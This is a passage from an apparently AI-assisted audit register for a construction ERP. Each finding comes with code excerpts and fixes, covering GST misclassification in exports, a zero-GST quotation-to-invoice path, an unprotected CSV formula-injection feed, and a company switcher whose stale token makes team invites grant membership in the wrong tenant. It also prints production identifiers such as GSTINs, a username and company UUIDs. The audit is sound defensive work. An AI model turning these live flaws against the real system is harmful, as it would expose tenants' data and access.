2. **It is polled, not clicked.** A BI key is long-lived and typically set up once on a schedule, so
   a payload lands on every refresh, silently, with no user in the loop to notice.
3. **`name`, `code`, `city`, `state` and `category` are all free text on project creation** — the
   fields a site engineer fills in — and all five ship in `feed_projects`.

### Fix
Reuse the existing helper rather than writing a fourth copy. The three local `_csv_safe_cell`
definitions (`dpr.py:24`, `hr.py:946`, `labour.py:35`) are already duplicates of each other; lift one
into a shared module and route all four exporters through it, `bi_export.py` included, so this class
cannot reopen a fifth time. Apply it inside `_to_csv` so every present and future feed route inherits
it — per-call-site application is what allowed this site to be missed.

### Gate this needs
A test asserting that **every** backend CSV producer neutralizes a leading `= + - @` cell, discovered
by enumeration rather than by a hardcoded list of four filenames. The existing per-finding gates all
pin their own file, which is precisely why three passed while the fourth was unprotected.

## FINDING R2-744 — 🔴 CRITICAL: the Tally export still books every supply as CGST+SGST, so an inter-state works contract is exported under the wrong tax heads — the one D4 surface the sweep missed

R2-410's fix (`c6f2dfb`) is correct on its own terms and is CONFIRMED: revenue and expense post at the
tax-exclusive base, GST lands on Output/Input CGST+SGST under a `Duties & Taxes` parent
(`tally_xml.py:52-54`), the party leg stays gross, and the vouchers balance. **This finding is about
the half of R2-410's own root-cause paragraph that outlived its fix.**

R2-410 as filed says it is "the third instance of the same root gap in this audit": the GST returns
fabricate a 50/50 split (R2-319), the invoice PDF prints no breakup (R2-399), and the Tally export
posts no tax at all. D4 (`520fb87`) closed that root gap — place of supply now derives from
`Project.state` per IGST Act s.12(3), and `Project.state` is enforced at write time with a 422
(verified live 2026-08-28: creating a project without `state` returns *"Project.state is required for
invoicing - set the site state (GST state code or name) before creating invoices; place of supply
derives from the site per IGST Act s.12(3)"*).

**D4 swept reports.py (R2-041/R2-319), quotations (R2-125) and the invoice PDF (R2-272). It did not
sweep tally.py.**

### The code
`backend/app/routers/tally.py:314-322` (sales) and `:334-342` (purchase) split the tax unconditionally:

```python
if gst > 0:
    half = round(gst / 2, 2)
    entries.append({"ledger": "Output CGST", "amount": half, "debit": False,
                    "ledger_type": "output_tax"})
    entries.append({"ledger": "Output SGST", "amount": round(gst - half, 2), "debit": False,
                    "ledger_type": "output_tax"})
```

There is no branch on state. `grep -c "igst\|IGST\|inter_state\|interstate"` over the **whole** of both
`tally.py` and `tally_xml.py` returns **0** in each — this is a whole-file count, not a truncated
grep.

The justification sits in the comment immediately above (`tally.py:304-305`):

> `# turnover. The 50/50 CGST/SGST halves follow the same documented`
> `# convention as reports._gst_split (no place-of-supply column).`

**That comment is now false in both of its clauses.** `reports._gst_split` (`reports.py:1093-1119`)
takes `project_state` and `supplier_gstin`, returns a four-tuple `(cgst, sgst, igst, utgst)`, and
documents itself as *"Same state -> CGST+SGST halves. Different -> IGST full. **Never unconditional
50/50.**"* It delegates to `app.gst_utils.gst_split`, which carries the full 01-38 state-code map. The
place-of-supply column the comment says does not exist is the column the rest of the system is now
validated against.

### Consequence
For an inter-state works contract — a Maharashtra-registered contractor running a site in Gujarat,
which is ordinary in this market — the same bill now produces two documents that disagree on the tax
head:

| Surface | Inter-state supply renders as |
|---|---|
| GSTR-1 / GSTR-3B report (`reports.py`) | **IGST**, full amount ✅ |
| Tax invoice PDF (`billing.py:794`) | **IGST**, `inter_state` computed ✅ |
| **Tally export (`tally.py:314`)** | **CGST + SGST, half each** ❌ |

The accountant imports the voucher, and the books carry input credit under CGST/SGST heads that the
GSTR-2B reconciliation — which reports IGST for the same invoice — will not match. Credit claimed
under the wrong head is not merely a presentation defect: it is disallowed on reconciliation and
attracts interest, and the mismatch surfaces at filing time rather than at import time.

This is strictly worse than the pre-D4 state of the other two surfaces, because those two are now
right. Before D4 all three were consistently wrong, which at least reconciled with itself.

### Severity
Filed CRITICAL, matching its parent R2-410. The money is misclassified rather than lost, but it is
misclassified in the export whose entire purpose is to become the statutory books, and it is silent —
the XML imports cleanly and the vouchers balance.

### Fix
Route the tally split through the same helper the rest of D4 uses rather than a fourth hand-rolled
convention: read the bill's project state and the company/branch GSTIN exactly as
`_rep_gstr1_sales` does (`reports.py:1136-1143`), call `gst_utils.gst_split`, and emit an
`Output IGST` / `Input IGST` ledger under the existing `Duties & Taxes` parent when the split
returns an IGST leg. `_ledger_parent` already routes `input_tax` / `output_tax` correctly, so the
XML side needs no change beyond the new ledger names.

Delete the stale comment at `tally.py:304-305` as part of the fix — it is what made this site look
already-considered.

### Gate this needs
A test that feeds one intra-state and one inter-state bill through `_build_vouchers` and asserts the
emitted ledger names, so the tally export cannot silently diverge from `gst_utils.gst_split` again.
The existing R2-410 gate pins the Duties & Taxes parent and voucher balance, both of which stay green
under this defect.

## FINDING R2-745 — 🔴 CRITICAL: converting a quotation to an invoice bypasses every line-item and tax check — an inter-state quotation becomes a tax invoice recording ZERO GST

R2-271 is CONFIRMED on the path it was filed against: `_validate_bill_line_items`
(`billing.py:919-968`) now rejects a tax invoice with no lines, requires a description per line, and
rejects any bill whose line amounts miss the subtotal by more than ₹0.01. R2-401's gate is real.

**But it is wired into exactly one call site** — `create_bill` at `billing.py:1000`. `grep -n
"_validate_bill_line_items"` over the whole file returns two lines: the definition and that single
call.

`crm.py:928-949` is a **second bill-creation surface**. `convert_quotation_to_invoice` constructs a
`Bill(...)` directly through the ORM, sets `subtotal`, `gst_amount`, `total_payable` and `items_json`
by hand, and calls no validator. Two independent defects follow, and neither can be caught downstream
because the invoice PDF renders whatever is stored.

### Defect 1 — inter-state quotations lose their entire tax
`crm.py:910`:

```python
gst_amount = float(quot.cgst_amount or 0) + float(quot.sgst_amount or 0)
total_payable = float(quot.total_amount or 0)
subtotal = total_payable - gst_amount
```

`igst_amount` is a real column (`models.py:1201`) and D4 sets it to the **full** tax amount on an
inter-state quotation, zeroing CGST and SGST to do so (`crm.py:701-710`):

```python
if _d4_inter is True:
    cgst_amount = 0.0
    sgst_amount = 0.0
    igst_amount = float(total_tax)
```

So for any inter-state supply the conversion computes `gst_amount = 0 + 0 = 0`, and therefore
`subtotal = total_payable` — the **gross** figure, tax included. The resulting tax invoice records
zero output GST and a subtotal inflated by exactly the tax that went missing.

That this is an oversight rather than a convention is settled by the rest of the same file: every
other place that totals a quotation's tax sums all three components —

```python
# crm.py:734 and again at :801
tax_amount=float(float(quot.cgst_amount or 0) + float(quot.sgst_amount or 0)
                 + float(getattr(quot, "igst_amount", 0) or 0)),
```

The conversion is the only reader of these three columns that drops one.

### Defect 2 — R2-271's own reconciliation gap, reopened on this path
`final_total` includes two components that no line item represents (`crm.py:699`):

```python
final_total = base_total + (req.additional_charges or 0.0) + (req.round_off or 0.0)
```

`items_json` is built from `CRMQuotationItem.total_amount` only. So whenever `additional_charges` or
`round_off` is non-zero, the emitted line items under-sum the stored subtotal by exactly that amount —
the ₹0.01-tolerance mismatch `_validate_bill_line_items` exists to reject, arriving through the door
that does not call it. This is R2-271's original defect ("a ₹10 line item printed on a ₹1,00,000
invoice"), reachable through a supported flow rather than a hand-crafted API call.

### Why CRITICAL
Defect 1 understates output GST liability to **zero** on the statutory document the customer files
and the auditor reads, for the ordinary case of a contractor billing a site in another state. It is
silent: the PDF renders cleanly, the totals internally "agree" because the subtotal absorbed the tax,
and the error is only discoverable by reconciling against the quotation it came from. This is the same
class of harm as R2-271 and R2-399, on a path both of those fixes left open.

### Not yet exercised live
E1 only. Proving it end to end needs a lead → quotation → convert run with `state` differing from the
company GSTIN prefix, and the current session's JWT is scoped to ZZ R8 Throwaway (which has no CRM
data) while AK Construction returns 403. Flagged for a session scoped to a tenant with CRM rows; the
code path above is unconditional, so the E1 read is decisive on its own.

### Fix
Route the conversion through `_validate_bill_line_items` rather than trusting hand-assembled totals —
that is the single change that closes both defects and prevents a third. Concretely: include
`igst_amount` in the `gst_amount` sum (reuse the `:734` expression, which is already correct), and
either emit `additional_charges` / `round_off` as their own line items or exclude them from
`subtotal`. The validator will then hold this path to the same contract as `create_bill`.

### Gate this needs
The R2-401 gate pins the validator's behaviour but not its **coverage**. Needed: a test asserting that
every path constructing a `Bill` passes through `_validate_bill_line_items`, plus a conversion test
for an inter-state quotation asserting `bill.gst_amount == quotation total tax`. The present gate stays
green under both defects above.

## FINDING R2-746 — 🔴 CRITICAL: switching company never re-mints the session, so `/auth/me`, `/auth/me/permissions` and the team-invite write all still target the PREVIOUS company

R2-186 ("a user can belong to several companies, and there is no way to switch between them") is
recorded FIXED by `1a564f1`: *"POST /auth/switch-company/{company_id} verifies membership and
re-mints the company-scoped session."* The endpoint exists and is correct. **Nothing calls it.**

```
$ grep -rn "switch-company" frontend/src
(no output)
```

`CompanySwitcher.tsx:39-47` is the entire switch implementation:

```tsx
const switchTo = useCallback(
  (newId: string, newName: string) => {
    const segments = (pathname || "").split("/");
    if (segments[1] === "c") segments[2] = newId;
    if (typeof window !== "undefined") localStorage.setItem("company_name", newName);
    setOpen(false);
    router.push(segments.join("/"));
  },
  [pathname, router]
);
```

It rewrites the URL segment, overwrites `company_name`, and navigates. It does **not** call the
re-mint endpoint, does **not** replace `access_token`, and does **not** update `company_id`. The fix
for R2-186 landed backend-only.

### The two identities then disagree
Company context is resolved two different ways:
- **Path-scoped routes** take `company_id` from the URL and check membership — these follow the UI.
- **`get_current_active_company_user`** (`auth.py:283-295`) decodes the JWT and reads its
  `company_id` claim — these follow the *pre-switch* company.

Three routes take the second path: `/auth/me` (:838), `/auth/me/permissions` (:875) and
**`/auth/team/invite` (:969)**.

### Proved live, 2026-08-28, in the founder's own session
The browser was showing AK Construction's finance page, rendering AK's party ledger, having switched
from ZZ R8 Throwaway:

| signal | value |
|---|---|
| URL segment / rendered data | `d3724ec3-edac-4b5f-b296-fc6a013b7b5d` — **AK Construction** |
| JWT `company_id` claim (decoded locally) | `1fa705a4-7aa6-42f2-9906-65902c96916f` — **ZZ R8 Throwaway** |
| `GET /auth/me` → `company_id` | `1fa705a4…` — **ZZ R8** |
| `GET /auth/me/permissions` → `company_id` | `1fa705a4…` — **ZZ R8**, role `Owner` |
| `localStorage.company_name` | `AK Construction` |
| `localStorage.company_id` | `1fa705a4…` — **ZZ R8** |

The screen says AK Construction. The identity endpoints say ZZ R8 Throwaway. Both are true at once.

### Consequences
1. **`/auth/team/invite` adds the invitee to the wrong company.** `invite_member` takes
   `company_id = ctx["company_id"]` (`auth.py:974`) — from the token claim. There is no company id in
   the path or payload, so the route has no way to learn which company the user is looking at. A user
   who switches to company B and invites a colleague **grants them membership of company A**, with a
   role looked up in A, and the UI reports success. This is a silent grant of access to a tenant the
   inviter did not intend to touch, which is the security-relevant half of this finding.
2. **The UI is gated by the wrong company's permissions.** `/auth/me/permissions` returns A's rights
   while B's screens render. A user who is Owner in A and Viewer in B sees Owner affordances
   throughout B. Path-scoped writes are still rejected server-side by `require_permission`, so this is
   a misleading-UI defect rather than a privilege escalation — but any control enforced only in the
   client is bypassed, and the user is shown actions that will fail.
3. **`localStorage.company_id` goes stale**, and `profile/onboarding/page.tsx:38` is its only reader.
   That page POSTs the stale id to `/profile/onboarding`, which sets `company.name`,
   `onboarding_city`, `onboarding_segment` and `onboarding_categories` (`profile.py:38-42`). Reaching
   it after a switch renames and reconfigures the *previous* company with details typed for the new
   one. Membership is checked, so the blast radius is limited to companies the user already belongs
   to.

### Why CRITICAL
Consequence 1 is a membership write against an unintended tenant, triggered by a supported UI action,
with a success message and no indication anything went to the wrong place. The multi-company switcher
exists precisely for users who hold several companies, which is exactly the population this misfires
for. It is also entirely invisible in single-company accounts and in any account holding the same role
everywhere — including the founder's, which is Owner in both, which is why it has survived.

### Fix
Have `switchTo` await `POST /auth/switch-company/{newId}`, store the re-minted `access_token` and the
returned `company_id` (the response already carries both — `siteflow.ts:49` writes `company_id` from
`data.company.id` on the login path and can be reused), and only then navigate. Failing the switch
should keep the user where they are rather than navigating with a stale token.

Independently, `/auth/team/invite` should take the target company explicitly and membership-check it
rather than inferring it from the token — a route that performs a membership write should not depend
on a claim the client cannot see or correct.

### Gate this needs
A test asserting that after `POST /auth/switch-company/{B}`, a token minted for A no longer resolves
to A on `/auth/me`; and a frontend test that `switchTo` issues the re-mint call before navigating.
Neither exists — R2-186's closure was verified on the endpoint alone, never on a caller.

## FINDING R2-747 — 🟠 HIGH: the invoice's HSN/SAC column was added but nothing ever fills it — the quotation that collects HSN drops it on conversion, and no validator requires it

R2-399 is **substantially CONFIRMED**. Six of the eight Rule 46 elements it tabulated as missing are
now present, verified by pulling a real PDF from production rather than by reading the code. Live
extraction of `ZZ-QA-AUDIT-001` (AK Construction, 2026-08-28), which is the finding's own example
bill — the PDF is uncompressed, so this is the document text itself:

```
AK Construction
Legal Name: SurajConstruction
GSTIN: 29ABCDE1234F1Z5
Address: Nerul , Navi Mumbai
Tax Invoice
Party: upadhyayprateek574
Invoice No: ZZ-QA-AUDIT-001
Recipient GSTIN: 27AAPFU0939F1ZV
Place of Supply: 27
Description                    HSN/SAC     Qty    Rate      Amount
QA audit line item                         1      100000    100000
SUMMARY / TOTALS
Subtotal: 100000.00
GST Amount: 18000.00
Total Payable: 118000.00
IGST: 18000.00
Amount in Words: One Lakh Eighteen Thousand Rupees Only
Tax Payable Under Reverse Charge: No
For AK Construction
Authorised Signatory
```

Supplier GSTIN and address, recipient GSTIN, the tax split, place of supply, amount in words, the
reverse-charge declaration and the signature block are all present and correct. The split is
IGST-only because supplier state 29 differs from place of supply 27 — D4 working as designed, on the
document, live.

### What is still missing
**The HSN/SAC column renders, and its cell is empty.** Look at the line-item row above: the `HSN/SAC`
header is printed, and the value between the description and `Qty` is blank. R2-399 filed
"HSN/SAC per line ❌"; the closure added the *column* and left the *value* unfilled, which is the same
Rule 46 defect wearing a header.

Two independent reasons it can never be populated today:

1. **Nothing requires it.** `billing.py:824` reads `str(it.get("hsn_sac") or "")` — the only mention of
   `hsn` in the whole file. `_validate_bill_line_items` (`billing.py:919-968`) enforces a description
   and the subtotal reconciliation, and says nothing about HSN. A bill created through
   `POST /billing/bills` with no `hsn_sac` on any line is accepted and prints blanks.
2. **The one path that HAS the data throws it away.** The CRM quotation UI collects HSN/SAC per item
   (`d/crm/page.tsx:62, 291, 574` — `hsn_sac: it.hsn_sac.trim() || null`) and the library stores it
   (`models.py:1231, 2111, 2131`). But `convert_quotation_to_invoice` rebuilds `items_json` by hand
   (`crm.py:915-921`) with exactly five keys:

   ```python
   {"desc": i.item_name, "cost_code_name": i.cost_code, "qty": float(i.qty),
    "rate": ..., "amount": float(i.total_amount or 0)}
   ```

   `hsn_sac` is not among them. Every invoice converted from a quotation therefore has a structurally
   blank HSN column, **even when the user filled HSN in on the quotation.**

**Recipient address is also absent.** R2-399's table required "recipient name, address and GSTIN"; the
PDF prints `Party:` and `Recipient GSTIN:` but no recipient address.

### Relationship to R2-745
Leg 2 is the same function and the same root cause as R2-745 — `convert_quotation_to_invoice`
hand-assembles a payload instead of going through a shared, validated builder, and each hand-assembly
drops a different field (`igst_amount` there, `hsn_sac` here). Fixing that function properly closes
both. Filed separately because leg 1 (no validator requires HSN on the direct creation path) is
independent of the conversion and survives fixing it.

### Severity
HIGH rather than CRITICAL: unlike R2-745 this misstates no amount. But HSN/SAC is mandatory per line
on a B2B tax invoice, the recipient uses it to claim credit, and an invoice missing it is rejectable —
so the document R2-399 set out to make lawful is still not.

### Fix
Carry `hsn_sac` through `convert_quotation_to_invoice` (the field is already on `CRMQuotationItem`),
and extend `_validate_bill_line_items` to require it for revenue invoice types, matching how that
function already requires a description. Add the recipient's address to `party_lines` beside the
recipient GSTIN.

### Observation, not filed
AK Construction's stored supplier GSTIN is `29ABCDE1234F1Z5` — the exact dummy value R2-114's closure
records as "now rejected" by the checksum validator. The validator is write-time and forward-only, so
this pre-existing row persists and prints on live invoices. Correct per that fix's stated scope, and
AK is a test tenant covered by `launch_cleanup.sql`, but it means every PDF this tenant emits today
carries a GSTIN that would fail its own validation.

## FINDING R2-748 — 🟡 MEDIUM: the invoice PDF and the shared party-name resolver use OPPOSITE precedence, so one party can print under two different names

R2-131 is CONFIRMED on its own claim: `app/party_names.py` exists as the single shared resolver, and
five surfaces use it — `billing.py:294,428` (subcon), `finance.py:1144,1280,1343` (ledger and payment
requests), `labour.py:29` (contractor), `subcon_performance.py:140`. "Unknown Party" and bare
login-name storage are gone from those paths.

**One surface does not use it, and inverts its precedence.** The invoice PDF builder resolves the
party name by hand at `billing.py:735-753`:

```python
if party.library_party_id:
    linked_party = db.query(LibraryParty)...
    if linked_party and linked_party.name:
        party_name = linked_party.name        # ← LibraryParty FIRST
if not party_name and party.user_id:
    party_user = db.query(User)...
    if party_user and party_user.name:
        party_name = party_user.name          # ← user second
```

The shared resolver does the opposite (`party_names.py:22-29`):

```python
if team.user_id:
    user = ...
    if user and user.name:
        return user.name                      # ← user FIRST
if team.library_party_id:
    party = ...
    if party and party.name:
        return party.name                     # ← LibraryParty second
```

For a counterparty holding **both** a login and a vendor-master row, the tax invoice prints the
business name while the finance ledger, party statement, labour report and subcontractor scorecard
all print the login name — for the same party, from the same record.

Notably `party_names.py`'s own docstring argues for the PDF's ordering, not its own: *"the real name
[is] reachable only through library_party_id -> LibraryParty.name, so any lookup that walks the users
table alone must fail for the normal external case (R2-131)."* The module documents LibraryParty as
the authoritative name and then checks it second.

### Latent today — stated plainly
Probed production 2026-08-28: of 9 `company_team` rows, **1** has both `user_id` and
`library_party_id` set, and for that row the two names are identical, so **zero** parties currently
render differently. The probe was calibrated — the same query returns the 1/6/2/0 population split,
so the null is real rather than a broken filter.

This is filed as MEDIUM because it misstates no amount and has no live instance, but the trigger is an
ordinary ERP scenario rather than a contrived one: a subcontractor who is given a login as
`Ramesh Kumar` while the vendor master carries `Kumar Construction Pvt Ltd`. From that moment the
invoice and the ledger disagree on who the counterparty is, and R2-418's lesson — that two figures
for one thing on one screen destroys trust in both — applies to names as much as amounts.

### Fix
Delete the hand-rolled block at `billing.py:735-753` and call `resolve_party_name`, then decide the
precedence **once**, in the shared resolver. Per its own docstring the correct order is LibraryParty
first (the business is the invoicing counterparty; the login is an individual who happens to
represent it), which means the PDF is right and the shared resolver should be changed to match — not
the reverse. The GSTIN lookup beside it already reads `LibraryParty.tax_no`, so the vendor master is
already treated as authoritative for the other half of the same block.

### Gate this needs
A test with one `CompanyTeam` carrying a `user_id` and a `library_party_id` whose names differ,
asserting the invoice PDF and `resolve_party_name` return the SAME string. No current test constructs
that row, which is why the two orderings have coexisted.

---

## R3 PRIORITISATION NOTE — the orphan-lineage rows are the high-yield subset

Recorded 2026-08-28 while verifying worklist row 28 (R2-599). Not a finding; a re-ordering decision
with its evidence, so the reasoning is auditable.

R2-727 established that 91 closed register rows cite a fix commit that is not on main's lineage, and
concluded "at least one fix was never reproduced". That sweep flagged the rows but did not open them,
so it could not say **which** of the 91 are still broken.

**R2-599 is the first of those rows opened individually, and its fix is confirmed absent from
production.** Its commit `bef6c73` is contained by exactly one branch —
`claude/siteflow-audit-round10-cont-f6961b`, the orphan — and the defect reproduces verbatim in the
shipped tree (`dpr.py:94` resolves a task by id alone and mutates it at `:97-100`). It is recorded
FIX_VERIFIED, the register's strongest status.

### Why this changes the order of work

| | count |
|---|---|
| Orphan-lineage rows (R2-727) | **91** — 45 CRITICAL, 28 HIGH, 18 MEDIUM |
| Of those, sitting in the R3 worklist as never-individually-opened | **89** |
| Opened so far | 1 (R2-599) |
| Still broken | 1 of 1 |

One sample is not a rate, and the true rate is certainly below 100% — R2-232's register addendum
records a case where the orphaned fix's *content* landed independently on main via another commit, so
some of the 89 are genuinely fixed. But the prior for this subset is plainly far above the ~1-in-70
measured across ordinary rows, because every one of them is a row whose recorded evidence points at
code that main never received.

The R3 worklist is ordered CRITICAL-first then by file cluster — chosen for reading efficiency, before
this subset was known to be checkable. **The remaining 88 orphan rows are now worked first**, then the
worklist resumes its original order. Each needs the same two steps R2-599 got: confirm the cited
commit is absent from `origin/main` (`git merge-base --is-ancestor`, never `git rev-parse`, per trap
9), then read the live tree to see whether the fix arrived by another route.

Rows whose fix content did land independently are CONFIRMED with the substitute commit named. Rows
where it did not are REGRESSED, and — as with R2-599 — need their register status corrected rather
than a duplicate finding number.

### Orphan-subset calibration after the first 6 rows

`scripts/verification/mainlineage.py` (self-tested against a known-positive and known-negative before
use) re-asked the lineage question against **origin/main** rather than `campaign/waves`, because
production ships from main. Result: **87 closed rows cite a fix commit that is not an ancestor of
origin/main** — 43 CRITICAL, 28 HIGH, 16 MEDIUM; 83 of them recorded FIX_VERIFIED.

Triage on whether the row's id appears in live source and tests split them: 42 annotated in both, 8 in
one, **37 in neither** (23 CRITICAL). Six of the 37 have now been hand-read:

| row | outcome | how the fix reached main |
|---|---|---|
| R2-042 | CONFIRMED | `e9dba8b`, landed under R2-231 — settlement no longer needs the party |
| R2-074 | CONFIRMED | the R2-170/R2-172 taxonomy work |
| R2-198 | CONFIRMED | present on main; all 29 wrappers await params |
| R2-244 | CONFIRMED | re-landed by the R2-727 sweep, annotated `R2-727` |
| R2-310 | CONFIRMED | present on main |
| **R2-599** | **REGRESSED** | **never re-landed; defect live** |

**Calibration: 1 of 6, not 6 of 6.** The orphan subset is materially riskier than an ordinary row but
it is not uniformly broken — the R2-727 sweep and the H-verify-sweep genuinely re-landed most of this
content on main, just under other commits and other ids. That is precisely why the cheap signals fail
here and each row needs reading:

- **A missing id annotation does not mean a missing fix.** R2-244's fix sits on main under an
  `R2-727:` comment; R2-042's under R2-231's commit. Both scored 0/0 on annotation.
- **An off-main commit citation does not mean a missing fix.** 5 of 6 were fixed anyway.
- **Only the live tree answers it.** Read the code against the finding as filed.

The remaining 31 zero-annotation rows (17 CRITICAL) stay the highest-priority queue, followed by the
50 annotated off-main rows as a lighter confirm.
